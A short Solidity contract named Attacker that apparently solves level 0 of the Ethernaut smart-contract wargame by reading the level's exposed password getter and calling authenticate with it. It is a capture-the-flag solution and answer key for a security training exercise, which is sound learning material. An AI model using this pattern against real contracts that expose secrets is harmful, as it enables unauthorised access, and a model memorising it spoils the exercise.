pragma solidity ^0.8.0;

import {Instance} from "ethernaut/00.sol";

contract Attacker {
    Instance level0;

    constructor(address _instance) {
        level0 = Instance(_instance);
    }

    function exploit() public {
        string memory password = level0.password();
        level0.authenticate(password);
        require(level0.getCleared());
    }
}
